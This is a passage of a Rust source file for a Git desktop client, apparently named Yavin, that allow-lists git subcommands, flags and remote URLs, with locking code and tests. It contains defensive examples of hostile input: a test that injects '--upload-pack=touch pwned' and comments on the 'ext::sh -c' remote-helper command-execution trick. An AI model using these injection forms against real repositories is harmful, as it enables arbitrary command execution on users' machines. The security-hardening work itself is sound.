// Deletion and rename -- no create flag, since `switch -c` already owns creation
// (SWITCH above). `-d`/`-D` are Git's own two-tier safety (safe delete vs. force);
// neither can bypass Git's separate, unconditional refusal to delete a branch
// checked out in any worktree (verified empirically, not assumed). `-m` (rename) is
// a pure local metadata change -- it moves a ref name, never a commit -- and has no
// refspec/force-push equivalent, so it doesn't reopen anything the delete-only
// design above was guarding against.
const BRANCH: &[FlagRule] = &[flag("-d"), flag("-D"), flag("-m")];
// `--prune` only ever removes LOCAL records of refs the remote no longer has -- it
// can never delete anything from the remote itself, and it never resets the graph
// (it removes a ref, never a commit object; see the plan's Section T). `--all`
// (Fetch From All Remotes) fetches every configured remote instead of just the
// current branch's; it takes no remote/refspec positional of its own.
const FETCH: &[FlagRule] = &[flag("--prune"), flag("--all")];

/// The declarative allow-list this whole design leans on: every subcommand
/// TypeScript may run, and every flag it may pass before a literal `--`. Anything not
/// listed here -- including a whole subcommand -- is refused. This is the single place
/// that needs updating when TypeScript needs a new Git capability.
fn rules_for(subcommand: &str) -> Option<&'static [FlagRule]> {
    Some(match subcommand {
        "status" => STATUS,
        "rev-parse" => REV_PARSE,
        "cat-file" => CAT_FILE,
        "diff" => DIFF,
        "add" => NONE,
        "restore" => RESTORE,
        "rm" => RM,
        "commit" => COMMIT,
        "reset" => RESET,
        "switch" => SWITCH,
        "branch" => BRANCH,
        "remote" => NONE,
        "fetch" => FETCH,
        "pull" => PULL,
        "push" => PUSH,
        "show" => SHOW,
        "stash" => STASH,
        "tag" => TAG,
        "apply" => APPLY,
        "check-ref-format" => CHECK_REF_FORMAT,
        "symbolic-ref" => SYMBOLIC_REF,
        "rebase" => ABORT_CONTINUE,
        "merge" => ABORT_CONTINUE,
        "cherry-pick" => ABORT_CONTINUE,
        "revert" => ABORT_CONTINUE,
        "log" => LOG,
        "for-each-ref" => FOR_EACH_REF,
        "worktree" => WORKTREE,
        _ => return None,
    })
}

fn validate_args(subcommand: &str, rest: &[String]) -> Result<(), String> {
    let rules = rules_for(subcommand)
        .ok_or_else(|| format!("Git operation '{subcommand}' is not supported"))?;
    let mut i = 0;
    let mut positional_only = false;
    // Everything that is not a flag (or a flag's value), and every flag that matched a rule.
    // `validate_shape` needs both: which flags are present, and what the positionals are.
    let mut positionals: Vec<&str> = Vec::new();
    let mut flags: Vec<&str> = Vec::new();
    while i < rest.len() {
        let arg = rest[i].as_str();
        if positional_only {
            positionals.push(arg);
            i += 1;
            continue;
        }
        if arg == "--" {
            positional_only = true;
            i += 1;
            continue;
        }
        if !arg.starts_with('-') {
            positionals.push(arg);
            i += 1;
            continue;
        }
        let rule = rules.iter().find(|r| {
            if r.prefix {
                arg.starts_with(r.name)
            } else {
                arg == r.name
            }
        });
        match rule {
            None => {
                return Err(format!(
                    "Argument '{arg}' is not permitted for 'git {subcommand}'"
                ))
            }
            Some(r) => {
                flags.push(arg);
                i += 1;
                if r.takes_value {
                    // The next token is this flag's value, whatever it looks like --
                    // it can never be reinterpreted as an option of its own.
                    i += 1;
                }
            }
        }
    }
    validate_shape(subcommand, &flags, &positionals)
}

/// A refspec is `[+]<src>:<dst>` (`+` forces the update, an empty `<src>` deletes the
/// remote ref). Yavin never passes one, and each of those forms would defeat a guarantee the
/// flag allow-list otherwise gives: there is no `--force` or `--delete` flag, yet `push origin
/// +main:main` and `push origin :branch` are both a positional away. Also rejects `::`
/// (`ext::` remote helpers) and anything URL-shaped, since only configured remote *names* are
/// ever used.
fn looks_like_refspec_or_url(arg: &str) -> bool {
    arg.starts_with('+') || arg.contains(':') || arg.contains("://")
}

/// Whether a URL may be stored as a remote's address.
///
/// This is a security boundary, not a tidiness check. `git remote add` writes the URL into
/// `.git/config`, and any later `fetch`/`pull`/`push` hands it to Git's transport layer --
/// where the `<helper>::<address>` form *executes* `git-remote-<helper>`, so a URL of
/// `ext::sh -c '<anything>'` is arbitrary command execution the moment the next fetch runs.
/// Everywhere else a URL could be smuggled in, `looks_like_refspec_or_url` already refuses it;
/// `remote add` is the one place a URL is legitimately the point, so it needs a positive
/// allow-list of the transports Git itself documents as URLs instead.
///
/// Reachable from the free-text "Add Remote…" dialog and from the AI tool surface, whose input
/// can be influenced by repository content -- so it is reachable by an attacker who only gets
/// the user to open a repository.
fn is_safe_remote_url(url: &str) -> bool {
    // `::` is the remote-helper form. A control character can also terminate the line in
    // `.git/config` and forge a second, unrelated setting underneath it.
    if url.is_empty()
        || url.contains("::")
        || url.starts_with('-')
        || url.chars().any(char::is_control)
    {
        return false;
    }
    // A host beginning with `-` is read as an option by the `ssh` that Git invokes on the
    // app's behalf -- the CVE-2017-1000117 class -- so it is refused wherever a host appears.
    let host_is_safe = |host: &str| !host.is_empty() && !host.starts_with('-');

    // `file://` names no host at all in its usual `file:///srv/git/r.git` form, so it is
    // checked on its path instead of being held to the host rule below.
    if let Some(path) = url.strip_prefix("file://") {
        return !path.is_empty();
    }
    for scheme in ["https://", "http://", "ssh://", "git://"] {
        if let Some(rest) = url.strip_prefix(scheme) {
            let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
            // Strip `user[:password]@`, legitimate on https:// and ssh://.
            let host = authority.rsplit('@').next().unwrap_or("");
            let host = host.split(':').next().unwrap_or("");
            return host_is_safe(host);
        }
    }
    // Any other `scheme://` is a transport this app has no reason to store.
    if url.contains("://") {
        return false;
    }
    // Git's scp-like SSH shorthand, `[user@]host:path`.
    if let Some((authority, _path)) = url.split_once(':') {
        return host_is_safe(authority.rsplit('@').next().unwrap_or(""));
    }
    // A plain local path (a sibling clone, a mounted share). Names no program to run.
    true
}

/// The exact argument shapes Yavin's own `Repository` methods produce, for the subcommands
/// where a permitted flag set alone leaves something dangerous reachable through positionals
/// (see the table test `every_repository_argv_shape_still_validates`). Subcommands not listed
/// here take ordinary pathspecs/revisions/names and are governed by their flag rules alone.
fn validate_shape(subcommand: &str, flags: &[&str], positionals: &[&str]) -> Result<(), String> {
    let refuse = |why: &str| {
        Err(format!(
            "'git {subcommand}' with these arguments is not permitted: {why}"
        ))
    };
    match subcommand {
        // fetch only ever runs against the branch's configured remote(s) (plain, or every
        // remote with --all); "Pull from…" is the one place a plain remote+branch pair is
        // legitimate on the read/network side, same reasoning as push-to below.
        "fetch" if !positionals.is_empty() => refuse("it takes no remote or refspec arguments"),
        "pull" => match positionals {
            [] => Ok(()),
            [remote, branch]
                if !looks_like_refspec_or_url(remote) && !looks_like_refspec_or_url(branch) =>
            {
                Ok(())
            }
            _ => refuse("only a plain pull, or pull <remote> <branch>, is allowed"),
        },
        // push: bare (optionally --tags), --set-upstream <remote> <branch> (publish),
        // --delete <remote> <ref> (Delete Remote Branch/Tag), or a plain <remote> <branch>
        // (Push to…) -- never a refspec, a URL or an `ext::` transport (`looks_like_refspec_or_url`).
        "push" => match positionals {
            [] => Ok(()),
            [remote, branch]
                if flags.contains(&"--set-upstream")
                    && !looks_like_refspec_or_url(remote)
                    && !looks_like_refspec_or_url(branch) =>
            {
                Ok(())
            }
            [remote, ref_name]
                if flags.contains(&"--delete")
                    && !looks_like_refspec_or_url(remote)
                    && !looks_like_refspec_or_url(ref_name) =>
            {
                Ok(())
            }
            [remote, branch]
                if flags.is_empty()
                    && !looks_like_refspec_or_url(remote)
                    && !looks_like_refspec_or_url(branch) =>
            {
                Ok(())
            }
            _ => refuse(
                "only a plain push, push --tags, --set-upstream <remote> <branch>, \
                 --delete <remote> <ref>, or push <remote> <branch> is allowed",
            ),
        },
        // Bare `git remote` lists names; `add`/`remove` take exactly the two/one positional(s)
        // Repository.addRemote()/removeRemote() produce. Re-pointing a remote's URL
        // (`set-url`) or renaming one is not something the app does.
        "remote" => match positionals {
            [] => Ok(()),
            ["add", name, url] if !name.is_empty() && !name.chars().any(char::is_control) => {
                if is_safe_remote_url(url) {
                    Ok(())
                } else {
                    refuse(
                        "that remote URL is not an accepted transport -- a remote helper such \
                         as `ext::` runs an arbitrary program on the next fetch",
                    )
                }
            }
            ["remove", name] if !name.is_empty() => Ok(()),
            // Reads the URL back for the commit hover card's "Open on GitHub" link.
            ["get-url", name] if !name.is_empty() => Ok(()),
            _ => refuse("only listing, adding, removing or reading the URL of a remote is allowed"),
        },
        "worktree" if positionals != ["list"] => refuse("only `worktree list` is allowed"),
        // `-a`/`--amend`/`-s` never replace the need for an explicit message -- without `-m`
        // a bare `commit --amend` would try to open an interactive editor Yavin never wires up.
        "commit" if !flags.contains(&"-m") || !positionals.is_empty() => {
            refuse("a commit message (-m) is required, and commit takes no positionals")
        }
        // A soft reset that isn't pinned to exactly one commit back would let a caller move
        // HEAD arbitrarily far; `Repository.undoLastCommit()` never asks for more than this.
        "reset" if flags != ["--soft"] || positionals != ["HEAD~1"] => {
            refuse("only a soft reset of HEAD~1 (undoing the last commit) is allowed")
        }
        "tag" => match (flags, positionals) {
            (["-l"], []) => Ok(()),
            ([], [name]) if !name.is_empty() => Ok(()),
            (["-d"], [name]) if !name.is_empty() => Ok(()),
            _ => refuse("only listing, creating or deleting a local tag is allowed"),
        },
        "branch" => match (flags, positionals) {
            (["-d"], [name]) | (["-D"], [name]) if !name.is_empty() => Ok(()),
            (["-m"], [new_name]) if !new_name.is_empty() => Ok(()),
            (["-m"], [old_name, new_name]) if !old_name.is_empty() && !new_name.is_empty() => {
                Ok(())
            }
            _ => refuse("only deleting (-d/-D) or renaming (-m) a branch is allowed"),
        },
        // "clear" (Drop All Stashes) and "show" (View Stash, read-only) join the existing
        // verbs; `-p`/`--no-color` on `show` are the same flags `diff()`/`show()` already use
        // for a readable, unambiguous unified diff.
        "stash" => match positionals {
            ["push" | "list" | "clear"] => Ok(()),
            ["pop" | "apply" | "drop"] => Ok(()),
            ["pop" | "apply" | "drop" | "show", entry] if is_stash_ref(entry) => Ok(()),
            _ => {
                refuse("only push, list, clear, show, pop, apply and drop of a stash@{n} entry are allowed")
            }
        },
        // Without the flag these would delete files / discard working-tree edits, bypassing
        // the confirm-and-keep-a-recovery-copy flow the UI puts in front of discarding.
        "rm" if !flags.contains(&"--cached") => refuse("only --cached (unstaging) is allowed"),
        "restore" if !flags.contains(&"--staged") => refuse("only --staged (unstaging) is allowed"),
        // cherry-pick/revert only ever continue, skip or abort one already in progress --
        // Yavin has no "Cherry-pick…"/"Revert…" UI to start one arbitrarily.
        "cherry-pick" | "revert" if !positionals.is_empty() || flags.len() != 1 => {
            refuse("only --abort, --continue or --skip on an existing operation is allowed")
        }
        // merge/rebase additionally allow starting one against a plain, unambiguous branch
        // name ("Merge…"/"Rebase Branch…") -- never a refspec, and never combined with
        // --abort/--continue/--skip in the same call.
        "merge" | "rebase" => match (flags, positionals) {
            (["--abort"], []) | (["--continue"], []) | (["--skip"], []) => Ok(()),
            ([], [branch]) if !branch.is_empty() && !looks_like_refspec_or_url(branch) => Ok(()),
            _ => refuse(
                "only starting a merge/rebase onto an existing branch, or --abort/--continue/\
                 --skip on one already in progress, is allowed",
            ),
        },
        // The graph's ref scope: the default (HEAD only), --all (every ref), or a single
        // named branch -- never a refspec, and --all is never combined with a branch name.
        "log" => match positionals {
            [] => Ok(()),
            [branch] if !flags.contains(&"--all") && !branch.is_empty() && !looks_like_refspec_or_url(branch) => {
                Ok(())
            }
            _ => refuse("only the default history, --all, or a single branch name is allowed"),
        },
        _ => Ok(()),
    }
}

/// `stash@{0}`, `stash@{12}` -- the only stash entry syntax `Repository` produces.
fn is_stash_ref(arg: &str) -> bool {
    arg.strip_prefix("stash@{")
        .and_then(|rest| rest.strip_suffix('}'))
        .is_some_and(|n| !n.is_empty() && n.bytes().all(|b| b.is_ascii_digit()))
}

/// Resolves which shared lock (if any) `args` requires against `repository_id`,
/// against real lock maps. Split out from `exec_on` because `git_exec` (the Tauri
/// command) must resolve this *before* handing off to `spawn_blocking` -- a
/// `tauri::State` borrow cannot cross that boundary (it isn't `'static`), unlike the
/// owned `Arc<Mutex<()>>` this returns, which can.
fn resolve_scope_lock(
    stash_locks: &StashLocks,
    network_locks: &NetworkLocks,
    repository_id: &str,
    args: &[String],
) -> Result<Option<Arc<Mutex<()>>>, String> {
    let Some(subcommand) = args.first() else {
        return Ok(None);
    };
    match operation_scope(subcommand, &args[1..]) {
        Scope::Stash => Ok(Some(lock_for(&stash_locks.0, repository_id)?)),
        Scope::Network => Ok(Some(lock_for(&network_locks.0, repository_id)?)),
        Scope::Read | Scope::WorktreeLocal => Ok(None),
    }
}

/// The full path an actual `git_exec` call takes: validate, then take whichever
/// shared lock this operation's scope required (already resolved by the caller via
/// `resolve_scope_lock`) before this worktree's own lock -- a fixed order every call
/// site uses, so no operation ever needs two locks acquired in different orders,
/// which is what would be needed to deadlock -- then run. Both lock acquisitions are
/// cancellable (`acquire_cancellable`): an operation cancelled while queued behind
/// another never acquires anything or spawns `git` at all. Shared by the Tauri
/// command and its tests.
fn exec_on(
    repo: &Repo,
    scope_lock: Option<Arc<Mutex<()>>>,
    args: &[String],
    input: Option<String>,
    cancel: Arc<AtomicBool>,
) -> Result<ToolOutput, String> {
    let subcommand = args.first().ok_or("Missing Git subcommand")?;
    validate_args(subcommand, &args[1..])?;

    let _scope_guard = scope_lock
        .as_ref()
        .map(|lock| acquire_cancellable(lock, &cancel))
        .transpose()?;
    let read_only = matches!(operation_scope(subcommand, &args[1..]), Scope::Read);
    let _worktree_guard = if read_only {
        None
    } else {
        Some(acquire_cancellable(&repo.lock, &cancel)?)
    };

    let args_ref: Vec<&str> = args.iter().map(String::as_str).collect();
    run_command(&repo.root, &args_ref, input, cancel, read_only)
}

// Every extra parameter here is a distinct piece of Tauri-managed state
// (`State<'_, T>`), which is how Tauri commands receive them -- not something a
// smaller helper struct could reduce without fighting that convention.
#[allow(clippy::too_many_arguments)]
#[tauri::command]
pub async fn git_exec(
    state: State<'_, Repos>,
    stash_locks: State<'_, StashLocks>,
    network_locks: State<'_, NetworkLocks>,
    jobs: State<'_, GitJobs>,
    repo_id: String,
    args: Vec<String>,
    input: Option<String>,
    id: String,
) -> Result<ToolOutput, String> {
    let repo = repo_of(&state, &repo_id)?;
    let scope_lock = resolve_scope_lock(&stash_locks, &network_locks, &repo.repository_id, &args)?;
    let cancel = register_job(&jobs, &id, &repo_id)?;
    // Removes this job's entry on every exit path below, including the `?` on the
    // next line -- `jobs` (a `State`, not `'static`) never crosses the
    // `spawn_blocking` boundary; only the `cancel` flag clone does.
    let _guard = JobGuard {
        jobs: &jobs,
        id: id.clone(),
    };
    tauri::async_runtime::spawn_blocking(move || exec_on(&repo, scope_lock, &args, input, cancel))
        .await
        .map_err(|e| e.to_string())?
}

/// Cancels every operation currently registered against one repository -- what the
/// Source Control panel's per-worktree Cancel button needs: since `RepoStore` only ever
/// has one operation in flight at a time, "cancel this repository's operations" and
/// "cancel the current operation" are the same thing, without TypeScript tracking
/// individual operation ids. An operation still waiting for its scope lock is already
/// registered here (before the lock is taken), so it is cancelled too and never runs.
#[tauri::command]
pub fn git_cancel_repo(jobs: State<'_, GitJobs>, repo_id: String) -> Result<(), String> {
    cancel_jobs_for_repo(&jobs, &repo_id)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::{
        fs,
        sync::atomic::AtomicU64,
        time::{Duration, Instant, UNIX_EPOCH},
    };

    /// A nanosecond timestamp alone is not unique enough: this module's tests now
    /// create several temp dirs per test (a main fixture plus linked worktrees) and
    /// run in parallel, and Windows' clock resolution is coarser than a nanosecond --
    /// two threads calling `SystemTime::now()` can observe the same value. Mixing in
    /// a process-wide monotonic counter closes that collision window.
    fn temp_dir() -> PathBuf {
        static COUNTER: AtomicU64 = AtomicU64::new(0);
        let sequence = COUNTER.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "yavin_git_native_test_{}_{sequence}",
            std::time::SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ))
    }

    /// A throwaway repository with one commit, returning its directory and a git runner.
    fn fixture() -> (PathBuf, impl Fn(&[&str]) -> bool) {
        let dir = temp_dir();
        fs::create_dir_all(&dir).unwrap();
        let at = dir.clone();
        let git = move |args: &[&str]| {
            Command::new("git")
                .current_dir(&at)
                .args(args)
                .status()
                .unwrap()
                .success()
        };
        assert!(git(&["init", "-q"]));
        assert!(git(&["config", "user.email", "test@example.invalid"]));
        assert!(git(&["config", "user.name", "Yavin Test"]));
        assert!(git(&["config", "commit.gpgsign", "false"]));
        assert!(git(&["config", "core.autocrlf", "false"]));
        fs::write(dir.join("a.txt"), "base\n").unwrap();
        assert!(git(&["add", "a.txt"]));
        assert!(git(&["commit", "-qm", "base"]));
        (dir, git)
    }

    fn open(dir: &Path) -> Repo {
        let toplevel = discover_toplevel(dir).unwrap();
        let repository_id = discover_common_dir(&toplevel)
            .map(|p| clean_path_str(&p))
            .unwrap_or_else(|_| clean_path_str(&toplevel));
        Repo {
            root: toplevel,
            repository_id,
            lock: Mutex::new(()),
            git_dir: OnceLock::new(),
        }
    }

    fn args(items: &[&str]) -> Vec<String> {
        items.iter().map(|s| s.to_string()).collect()
    }

    /// Test convenience matching `exec_on`'s old (pre-scope-lock) call shape: fresh,
    /// throwaway lock maps every call, correct for every test that isn't itself
    /// exercising cross-call lock sharing (those construct `StashLocks`/
    /// `NetworkLocks` explicitly and share them across threads instead).
    fn exec(repo: &Repo, args: &[String], input: Option<String>) -> Result<ToolOutput, String> {
        let stash_locks = StashLocks::default();
        let network_locks = NetworkLocks::default();
        let scope_lock =
            resolve_scope_lock(&stash_locks, &network_locks, &repo.repository_id, args).unwrap();
        exec_on(
            repo,
            scope_lock,
            args,
            input,
            Arc::new(AtomicBool::new(false)),
        )
    }

    #[test]
    fn a_disallowed_flag_is_rejected_before_git_ever_runs() {
        let (dir, _git) = fixture();
        let repo = open(&dir);
        // This is exactly the option-injection shape a malicious "remote name" or
        // "branch name" could try to smuggle in; it must never reach `git push`.
        let result = exec(
            &repo,
            &args(&["push", "--upload-pack=touch pwned", "origin", "main"]),
            None,
        );
        let _ = fs::remove_dir_all(&dir);
        let error = result.unwrap_err();
        assert!(error.contains("not permitted"), "unexpected error: {error}");
    }

    #[test]
    fn a_value_flag_accepts_a_dash_prefixed_value_without_reinterpreting_it() {
        let (dir, _git) = fixture();
        let repo = open(&dir);
        fs::write(dir.join("a.txt"), "changed\n").unwrap();
        exec(&repo, &args(&["add", "a.txt"]), None).unwrap();
        // A commit message that happens to start with '-' is still just a message.
        let result = exec(&repo, &args(&["commit", "-m", "-not a flag"]), None);
        let _ = fs::remove_dir_all(&dir);
        assert!(result.is_ok());
    }

    #[test]
    fn a_pathspec_after_double_dash_may_itself_start_with_a_dash() {
        let (dir, _git) = fixture();
        let repo = open(&dir);
        fs::write(dir.join("-weird.txt"), "x\n").unwrap();
        let result = exec(&repo, &args(&["add", "--", "-weird.txt"]), None);
        let _ = fs::remove_dir_all(&dir);
        assert!(result.is_ok());
    }

    #[test]
    fn an_unsupported_subcommand_is_rejected() {
        let (dir, _git) = fixture();
        let repo = open(&dir);
        let result = exec(
            &repo,
            &args(&["config", "--global", "user.name", "x"]),
            None,
        );
        let _ = fs::remove_dir_all(&dir);
        assert!(result.unwrap_err().contains("not supported"));
    }

    /// The Git State & Synchronization plan's Race 6/7 -- a worktree directory
    /// disappearing externally (deleted, or moved out from under Yavin) mid-
    /// session -- must degrade to a clean Git-level error, never a panic or a
    /// silently-corrupted result.
    #[test]
    fn a_worktree_deleted_out_from_under_an_open_repo_fails_cleanly_not_a_panic() {
        let (dir, _git) = fixture();
        let repo = open(&dir);
        fs::remove_dir_all(&dir).unwrap();

        let result = exec(&repo, &args(&["status", "--porcelain=v1", "-z"]), None);

        assert!(
            result.is_err(),
            "a deleted worktree must fail, not silently return an empty (falsely-clean) status"
        );
    }

    #[test]
    fn opening_a_nested_subfolder_resolves_to_the_true_toplevel() {
        let (dir, git) = fixture();
        fs::create_dir_all(dir.join("nested/sub")).unwrap();
        fs::write(dir.join("nested/sub/b.txt"), "x\n").unwrap();
        assert!(git(&["add", "nested/sub/b.txt"]));
        assert!(git(&["commit", "-qm", "nested file"]));

        let toplevel = discover_toplevel(&dir.join("nested/sub")).unwrap();
        let root = dir.canonicalize().unwrap();
        let _ = fs::remove_dir_all(&dir);
        assert_eq!(
            toplevel, root,
            "a nested folder resolves to the real repo root"
        );
    }

    #[test]
    fn a_linked_worktree_shares_its_main_worktrees_common_directory() {
        let (dir, git) = fixture();
        let linked = temp_dir();
        assert!(git(&[
            "worktree",
            "add",
            linked.to_str().unwrap(),
            "-b",
            "feature",
        ]));

        let main_common = discover_common_dir(&dir);
        let linked_common = discover_common_dir(&linked);
        // discover_toplevel, by contrast, is expected to differ between them --
        // that's exactly why identity must key on the common dir, not the toplevel.
        let main_toplevel = discover_toplevel(&dir);
        let linked_toplevel = discover_toplevel(&linked);

        let _ = fs::remove_dir_all(&linked);
        let _ = fs::remove_dir_all(&dir);

        assert_eq!(
            main_common.unwrap(),
            linked_common.unwrap(),
            "a linked worktree's common Git directory must match its main worktree's"
        );
        assert_ne!(
            main_toplevel.unwrap(),
            linked_toplevel.unwrap(),
            "a linked worktree's own toplevel must differ from the main worktree's"
        );
    }

    #[test]
    fn a_worktree_is_ready_missing_or_invalid() {
        let (dir, git) = fixture();
        let linked = temp_dir();
        assert!(git(&[
            "worktree",
            "add",
            linked.to_str().unwrap(),
            "-b",
            "feature",
        ]));

        assert_eq!(probe_worktree(&dir), "ready");
        assert_eq!(probe_worktree(&linked), "ready");

        // The linked folder is deleted out from under the app.
        fs::remove_dir_all(&linked).unwrap();
        assert_eq!(probe_worktree(&linked), "missing");
        // The main worktree is unaffected.
        assert_eq!(probe_worktree(&dir), "ready");

        // A folder that exists but is no longer a work tree (its `.git` is gone).
        let plain = temp_dir();
        fs::create_dir_all(&plain).unwrap();
        assert_eq!(probe_worktree(&plain), "invalid");

        // A folder inside a *different* repository is not this worktree either.
        let inner = dir.join("inner");
        fs::create_dir_all(&inner).unwrap();
        assert_eq!(probe_worktree(&inner), "invalid");

        let _ = fs::remove_dir_all(&plain);
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn worktree_list_porcelain_is_reachable_through_the_guarded_executor() {
        let (dir, git) = fixture();
        let linked = temp_dir();
        assert!(git(&[
            "worktree",
            "add",
            linked.to_str().unwrap(),
            "-b",
            "feature",
        ]));

        let repo = open(&dir);
        let output = exec(&repo, &args(&["worktree", "list", "--porcelain"]), None);
        // `-z` (NUL-terminated records, what TypeScript asks for first) is reachable too.
        let nul_output = exec(
            &repo,
            &args(&["worktree", "list", "--porcelain", "-z"]),
            None,
        );
        // Only `--porcelain` and `-z` are allow-listed; an unrelated flag must still be refused.
        let rejected = exec(&repo, &args(&["worktree", "list", "--bogus-flag"]), None);

        let _ = fs::remove_dir_all(&linked);
        let _ = fs::remove_dir_all(&dir);

        assert!(output.unwrap().stdout.contains("branch refs/heads/feature"));
        let nul_output = nul_output.unwrap().stdout;
        assert!(nul_output.contains("branch refs/heads/feature\0"));
        assert!(rejected.unwrap_err().contains("not permitted"));
    }

    #[test]
    fn cat_file_filters_applies_checkout_line_endings() {
        let (dir, git) = fixture();
        git(&["config", "core.autocrlf", "true"]);
        fs::write(dir.join("a.txt"), "one\ntwo\n").unwrap();
        assert!(git(&["add", "a.txt"]));
        let repo = open(&dir);
        let output = exec(&repo, &args(&["cat-file", "--filters", ":a.txt"]), None);
        let _ = fs::remove_dir_all(&dir);
        assert_eq!(output.unwrap().stdout, "one\r\ntwo\r\n");
    }

    #[test]
    fn an_interrupted_merge_is_reported_and_can_be_abandoned() {
        let (dir, git) = fixture();
        let main = String::from_utf8(
            Command::new("git")
                .current_dir(&dir)
                .args(["branch", "--show-current"])
                .output()
                .unwrap()
                .stdout,
        )
        .unwrap();
        let main = main.trim().to_string();

        assert!(git(&["switch", "-qc", "other"]));
        fs::write(dir.join("a.txt"), "theirs\n").unwrap();
        assert!(git(&["commit", "-qam", "theirs"]));
        assert!(git(&["switch", "-q", &main]));
        fs::write(dir.join("a.txt"), "ours\n").unwrap();
        assert!(git(&["commit", "-qam", "ours"]));
        assert!(!git(&["merge", "other"]));

        let repo = open(&dir);
        let during = repo_state(&repo);
        let abort = exec(&repo, &args(&["merge", "--abort"]), None);
        let after = repo_state(&repo);
        let content = fs::read_to_string(dir.join("a.txt")).unwrap();
        let _ = fs::remove_dir_all(&dir);

        assert_eq!(during.unwrap(), "merge");
        assert!(abort.is_ok());
        assert_eq!(after.unwrap(), "");
        assert_eq!(
            content, "ours\n",
            "abort restores the pre-merge working tree"
        );
    }

    #[test]
    fn apply_cached_stages_a_patch_supplied_over_stdin() {
        let (dir, _git) = fixture();
        let repo = open(&dir);
        fs::write(dir.join("a.txt"), "base\nchanged\n").unwrap();
        let diff = exec(&repo, &args(&["diff", "--", "a.txt"]), None).unwrap();

        let apply = exec(&repo, &args(&["apply", "--cached"]), Some(diff.stdout));
        let staged = exec(&repo, &args(&["diff", "--cached", "--", "a.txt"]), None);
        // --cached only touches the index; since the working tree already matched the
        // patch, the index now matches the working tree too, so the unstaged diff empties.
        let worktree_diff = exec(&repo, &args(&["diff", "--", "a.txt"]), None);
        let _ = fs::remove_dir_all(&dir);

        assert!(apply.is_ok(), "apply failed: {:?}", apply.err());
        assert!(staged.unwrap().stdout.contains("+changed"));
        assert_eq!(worktree_diff.unwrap().stdout, "");
    }

    /// A main worktree plus two linked worktrees, each on its own branch (Git itself
    /// refuses two worktrees on the same branch -- see the plan's empirical
    /// verification), for the cross-worktree locking tests below.
    fn fixture_with_two_linked_worktrees() -> (PathBuf, Repo, Repo) {
        let (dir, git) = fixture();
        let a = temp_dir();
        let b = temp_dir();
        assert!(git(&[
            "worktree",
            "add",
            a.to_str().unwrap(),
            "-b",
            "worktree-a"
        ]));
        assert!(git(&[
            "worktree",
            "add",
            b.to_str().unwrap(),
            "-b",
            "worktree-b"
        ]));
        (dir, open(&a), open(&b))
    }

    #[test]
    fn stash_pushes_from_different_worktrees_of_the_same_repository_do_not_corrupt_shared_state() {
        let (dir, repo_a, repo_b) = fixture_with_two_linked_worktrees();
        let (root_a, root_b) = (repo_a.root.clone(), repo_b.root.clone());
        fs::write(root_a.join("a.txt"), "change from A\n").unwrap();
        fs::write(root_b.join("a.txt"), "change from B\n").unwrap();
        assert_eq!(
            repo_a.repository_id, repo_b.repository_id,
            "both worktrees must resolve to the same repository identity for this \
             test to actually exercise the stash lock"
        );

        let stash_locks = Arc::new(StashLocks::default());
        let network_locks = Arc::new(NetworkLocks::default());
        let repo_a = Arc::new(repo_a);
        let repo_b = Arc::new(repo_b);

        let run_stash = |repo: Arc<Repo>, message: &'static str| {
            let stash_locks = stash_locks.clone();
            let network_locks = network_locks.clone();
            std::thread::spawn(move || {
                let call = args(&["stash", "push", "-u", "-m", message]);
                let scope_lock =
                    resolve_scope_lock(&stash_locks, &network_locks, &repo.repository_id, &call)
                        .unwrap();
                exec_on(
                    &repo,
                    scope_lock,
                    &call,
                    None,
                    Arc::new(AtomicBool::new(false)),
                )
            })
        };
        let handle_a = run_stash(repo_a, "from-a");
        let handle_b = run_stash(repo_b, "from-b");
        let result_a = handle_a.join().unwrap();
        let result_b = handle_b.join().unwrap();

        let list = Command::new("git")
            .current_dir(&dir)
            .args(["stash", "list"])
            .output()
            .unwrap();
        let list = String::from_utf8_lossy(&list.stdout).into_owned();

        let _ = fs::remove_dir_all(&root_a);
        let _ = fs::remove_dir_all(&root_b);
        let _ = fs::remove_dir_all(&dir);

        assert!(result_a.is_ok(), "{:?}", result_a.err());
        assert!(result_b.is_ok(), "{:?}", result_b.err());
        assert_eq!(
            list.lines().count(),
            2,
            "both concurrent stashes must land intact on the one shared refs/stash \
             -- neither corrupted nor silently dropped:\n{list}"
        );
    }

    #[test]
    fn worktree_local_operations_across_different_worktrees_are_not_serialized() {
        let (dir, repo_a, repo_b) = fixture_with_two_linked_worktrees();
        let (root_a, root_b) = (repo_a.root.clone(), repo_b.root.clone());
        fs::write(root_b.join("a.txt"), "change from B\n").unwrap();

        let repo_a = Arc::new(repo_a);
        let repo_b = Arc::new(repo_b);
        let a_for_thread = repo_a.clone();

        let started = Instant::now();
        // A does nothing but read; B stages and commits. If the new locks
        // accidentally serialized worktree-local operations across worktrees (the
        // exact regression this design exists to avoid), A would have to wait for
        // B's whole stage+commit before running at all.
        let handle_b = std::thread::spawn(move || {
            exec(&repo_b, &args(&["add", "a.txt"]), None).unwrap();
            exec(&repo_b, &args(&["commit", "-m", "from b"]), None)
        });
        let status_a = exec(
            &a_for_thread,
            &args(&["status", "--porcelain=v1", "-z"]),
            None,
        );
        let a_finished_at = started.elapsed();
        let result_b = handle_b.join().unwrap();

        let _ = fs::remove_dir_all(&root_a);
        let _ = fs::remove_dir_all(&root_b);
        let _ = fs::remove_dir_all(&dir);

        assert!(status_a.is_ok());
        assert!(result_b.is_ok(), "{:?}", result_b.err());
        assert!(
            a_finished_at < Duration::from_secs(2),
            "A's read took {a_finished_at:?} -- it should never have to wait on B's \
             unrelated worktree-local commit"
        );
    }

    #[test]
    fn cancelling_an_operation_queued_behind_a_held_stash_lock_never_lets_it_run() {
        let (dir, git) = fixture();
        let repository_id = discover_common_dir(&dir)
            .map(|p| clean_path_str(&p))
            .unwrap();
        let repo = open(&dir);
        assert_eq!(repo.repository_id, repository_id);

        let stash_locks = StashLocks::default();
        // Hold the stash lock ourselves, simulating another operation already
        // running, so the call below has to queue for it.
        let held = lock_for(&stash_locks.0, &repository_id).unwrap();
        let _held_guard = held.lock().unwrap();

        let cancel = Arc::new(AtomicBool::new(true));
        let network_locks = NetworkLocks::default();
        let call = args(&["stash", "push", "-u", "-m", "should never run"]);
        let scope_lock =
            resolve_scope_lock(&stash_locks, &network_locks, &repo.repository_id, &call).unwrap();
